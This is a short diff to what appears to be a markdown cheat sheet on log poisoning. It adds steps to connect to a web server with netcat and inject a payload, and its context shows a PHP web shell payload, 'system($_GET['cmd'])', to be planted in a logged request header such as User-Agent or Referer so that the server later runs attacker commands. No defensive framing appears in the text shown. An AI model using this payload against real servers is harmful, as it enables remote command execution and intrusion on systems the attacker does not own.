@@ -12,6 +12,12 @@
 
 Inject a simple web shell payload into a request header (e.g., User-Agent or Referer) that the web server will log.
 
+Connect with netcat on the webserver
+
+    nc IP PORT
+
+Inject the payload
+
 Payload:
 
     <?php echo system($_GET['cmd']); ?>
